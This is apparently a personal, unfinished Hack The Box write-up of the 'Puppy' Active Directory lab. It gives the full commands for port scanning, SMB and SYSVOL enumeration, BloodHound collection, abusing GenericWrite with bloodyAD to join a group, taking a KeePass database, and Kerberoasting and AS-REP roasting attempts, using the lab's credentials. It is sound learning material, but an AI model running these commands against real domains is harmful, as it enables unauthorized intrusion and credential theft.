# Puppy - HTB Writeup

**IP:** 10.129.232.75
**Date Started:** 2026-01-28
**Status:** Foothold in progress
**Current User:** levi.james (member of Developers, HR)
**Flags:** User ✗ | Root ✗

---

## 1) Initial Recon - Port Scan

**Command**
```bash
nmap -p- --min-rate=3000 -oN nmap/puppyNmapOpenPorts.txt 10.129.232.75
nmap -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49669,49676,49694,61839 -sSCV --min-rate=2000 -Pn -oN nmap/puppyNmapServicesVersions.txt 10.129.232.75
```

**Flags/Notes**
- `-p-` = scan all 65535 ports
- `--min-rate=3000` = send at least 3000 packets/sec for speed
- `-sSCV` = SYN scan + service version + default scripts
- `-Pn` = skip host discovery (assume host is up)
- `-oN` = output to normal format file

**Key Output**
- **53 (DNS)**, **88 (Kerberos)**, **389/636 (LDAP/LDAPS)**, **3268/3269 (Global Catalog)** = Domain Controller
- **Domain:** PUPPY.HTB
- **Hostname:** DC
- **OS:** Windows Server 2022 Build 20348
- **5985 (WinRM)** = potential shell path if we get proper creds
- **2049 (NFS)** = unusual for DC, worth investigating
- **3260 (iSCSI)** = also unusual
- **Clock skew:** 7h00m02s (needs sync for Kerberos, but delaying due to HTB timer)
- **SMB signing:** enabled and required (NTLM relay blocked)

**Decision**
Standard Domain Controller with some unusual services (NFS, iSCSI). Start with provided credentials validation.

---

## 2) Credential Validation

**Starting credentials:** `levi.james / KingofAkron2025!`

**Command**
```bash
nxc smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
nxc winrm 10.129.232.75 -u levi.james -p 'KingofAkron2025!'
```

**Flags/Notes**
- `nxc smb` = NetExec SMB module for authentication testing
- `--shares` = enumerate SMB shares after successful auth
- `nxc winrm` = test WinRM access (checks Remote Management Users membership)
- `[+]` without `(Pwn3d!)` = valid user, limited access
- `[-]` = authentication failed

**Key Output**
```
SMB: [+] PUPPY.HTB\levi.james:KingofAkron2025!
     Share: DEV (DEV-SHARE for PUPPY-DEVS) - access denied initially
     Share: SYSVOL - READ access
     Share: NETLOGON - READ access

WinRM: [-] PUPPY.HTB\levi.james:KingofAkron2025!
```

**Decision**
Creds are valid for domain but levi.james is not in Remote Management Users. No direct shell access yet. Investigate SYSVOL and run BloodHound to find escalation paths.

---

## 3) SYSVOL Enumeration - GPO Files

**Command**
```bash
smbclient //10.129.232.75/SYSVOL -U 'PUPPY.HTB\levi.james%KingofAkron2025!'
# From smb prompt:
recurse ON
ls
get {31B2F340-016D-11D2-945F-00C04FB984F9}/GptTmpl.inf
get 6AC1786C-016F-11D2-945F-00C04fB984F9/GptTmpl.inf
get 6AC1786C-016F-11D2-945F-00C04fB984F9/Registry.pol
```

**Flags/Notes**
- `smbclient` = interactive SMB client
- `//IP/SHARE` = UNC path
- `-U 'DOMAIN\user%password'` = auth format (% separates user from password)
- `recurse ON` = enable recursive directory listing
- GPO folders have GUID names

**Key Output**
Found GPO template (`GptTmpl.inf`) showing privilege assignments:
- `SeBackupPrivilege` = S-1-5-32-544 (Administrators), S-1-5-32-551 (Backup Operators), S-1-5-32-549 (Server Operators)
- `SeRestorePrivilege` = same SIDs
- Standard DC privilege assignments, nothing exploitable yet

Registry.pol files show Defender disabled in some policies (noted for later).

**Decision**
Standard GPO config. Move to BloodHound for ACL enumeration.

---

## 4) BloodHound Collection

**Command**
```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.232.75 -c All --zip -o ~/Documents/obsidian/docs/CTF/HTB/Puppy/bloodhound/
```

**Flags/Notes**
- `bloodhound-python` = Python-based BloodHound ingestor (doesn't require Windows)
- `-c All` = collect all data (users, groups, computers, ACLs, sessions, trusts, GPOs)
- `--zip` = output as single ZIP file for BloodHound import
- `-ns` = nameserver IP (DC) for DNS resolution
- `-o` = output directory

**Key Output**
Collection completed successfully. Imported to BloodHound GUI.

**BloodHound Findings:**
1. **levi.james** is member of `HR@puppy.htb` group
2. **HR** has `GenericWrite` over `Developers@puppy.htb` group
3. **Developers** members: `adam.silver`, `ant.edwards`, `jamie.williams`
4. **Developers** has READ access to DEV share (explains initial access denied)
5. **Senior Devs** has `GenericAll` over `adam.silver@puppy.htb`
6. **adam.silver** is member of `Remote Management Users` (WinRM access!)
7. No direct control path from levi.james to Senior Devs or adam.silver

**Attack Path Identified:**
```
levi.james (in HR) → GenericWrite on Developers →
Add self to Developers → Access DEV share →
Need path to Senior Devs → GenericAll on adam.silver →
WinRM as adam.silver
```

**Decision**
Use GenericWrite to add levi.james to Developers group. Investigate DEV share for credentials or path to Senior Devs.

---

## 5) Group Membership Manipulation - Add to Developers

**Command**
```bash
bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.129.232.75 add groupMember 'Developers' 'levi.james'
```

**Flags/Notes**
- `bloodyAD` = LDAP-based AD manipulation tool
- `add groupMember <group> <user>` = add user to group
- Uses LDAP authentication (no Kerberos needed, clock skew doesn't matter)
- Immediate effect, no waiting for group policy refresh

**Key Output**
```
[+] levi.james added to Developers
```

**Decision**
Successfully added. Now can access DEV share. Check for credentials or escalation paths.

---

## 6) DEV Share Enumeration - KeePass Database Found

**Command**
```bash
smbclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
# From smb prompt:
dir
cd Projects
ls
get recovery.kdbx
get KeePassXC-2.7.9-Win64.msi
```

**Flags/Notes**
- Now have access after being added to Developers group
- `prompt OFF` = disable confirmation prompts for bulk downloads
- `mget *` = download multiple files

**Key Output**
```
DEV share contents:
- KeePassXC-2.7.9-Win64.msi (34,394,112 bytes)
- Projects/ (empty directory)
- recovery.kdbx (2,677 bytes) - KeePass database!
```

**Decision**
KeePass database likely contains credentials. Attempt to extract and crack.

---

## 7) KeePass Analysis - KDBX4 Format (Blocked)

**Command**
```bash
keepass2john recovery.kdbx > loot/keepass.hash
```

**Flags/Notes**
- `keepass2john` = extracts hash from KeePass database for cracking
- Part of john-the-ripper toolkit

**Key Output**
```
! recovery.kdbx : File version '40000' is currently not supported!
```

**Analysis**
- KDBX version 40000 = KeePass 2.54+ using KDBX 4.0 format
- `keepass2john` doesn't support this newer format yet
- Alternative tools (`kpcli`) can import but need master password
- CVE-2023-32784 (KeePass memory dump vuln) might work after getting shell

**Decision**
KeePass is blocked for now. Need to find alternative paths: check for Kerberoasting, AS-REP roasting, or find path to Senior Devs.

---

## 8) Kerberoasting Attempt

**Command**
```bash
impacket-GetUserSPNs puppy.htb/levi.james:'KingofAkron2025!' -dc-ip 10.129.232.75 -request
```

**Flags/Notes**
- `impacket-GetUserSPNs` = queries for accounts with Service Principal Names set
- `-request` = actually request TGS tickets for offline cracking
- If successful, returns `$krb5tgs$23$*` hashes crackable with hashcat mode 13100

**Key Output**
No output (no Kerberoastable accounts found).

**Decision**
No SPNs set on any accounts. Try AS-REP roasting next.

---

## 9) AS-REP Roasting Attempt

**Command**
```bash
# Create user list
echo -e "adam.silver\nant.edwards\njamie.williams" > loot/users.txt

impacket-GetNPUsers puppy.htb/ -dc-ip 10.129.232.75 -usersfile ~/Documents/obsidian/docs/CTF/HTB/Puppy/loot/users.txt -format hashcat
```

**Flags/Notes**
- `impacket-GetNPUsers` = checks for users with "Do not require Kerberos preauthentication" flag
- `-usersfile` = file containing usernames to test (one per line)
- `-format hashcat` = output in hashcat format
- If vulnerable, returns `$krb5asrep$23$` hashes for offline cracking

**Key Output**
```
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ant.edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jamie.williams doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Analysis**
- `KDC_ERR_CLIENT_REVOKED` for adam.silver = account is disabled or locked
- This is a problem - our target (adam.silver in Remote Management Users) appears to be disabled
- ant.edwards and jamie.williams not vulnerable to AS-REP roasting

**Decision**
adam.silver might be disabled. Need to find alternative escalation paths via Senior Devs members or check for GPO control.

---

## 10) Current Status & Next Steps

**What we know:**
- levi.james is now in Developers and HR groups
- DEV share accessed, found recovery.kdbx (KDBX4, can't crack yet)
- Attack path exists: Senior Devs → GenericAll → adam.silver → WinRM
- But: adam.silver appears disabled (KDC_ERR_CLIENT_REVOKED)
- No control over Senior Devs group yet
- No Kerberoasting or AS-REP roasting opportunities found
- ant.edwards and jamie.williams also in Senior Devs but no direct control over them

**Branch points to explore:**
1. Check if Developers has control over any GPOs (GPO abuse for code execution)
2. Password spray `KingofAkron2025!` against all domain users (password reuse)
3. Extract and analyze KeePassXC-2.7.9-Win64.msi for embedded credentials or config
4. Check if Developers has control over computer objects (resource-based constrained delegation)
5. Investigate NFS (port 2049) or iSCSI (port 3260) for exposed data

**Evidence captured:**
- nmap scans: `nmap/puppyNmapOpenPorts.txt`, `nmap/puppyNmapServicesVersions.txt`
- BloodHound data: `bloodhound/*.zip`
- KeePass database: `loot/recovery.kdbx`
- KeePass installer: `loot/KeePassXC-2.7.9-Win64.msi`
- GPO files: `loot/{GUID}/GptTmpl.inf`, `loot/{GUID}/Registry.pol`

---

## Lessons Learned

- **GenericWrite over groups** = can add members, different from GenericWrite over users (Shadow Credentials)
- **KDBX 4.0 format** not supported by keepass2john yet - need alternative methods
- **KDC_ERR_CLIENT_REVOKED** = account disabled/locked, blocks authentication
- **BloodHound graph analysis** critical for finding multi-hop ACL paths
- Always check group membership changes immediately (Developers → DEV share access)

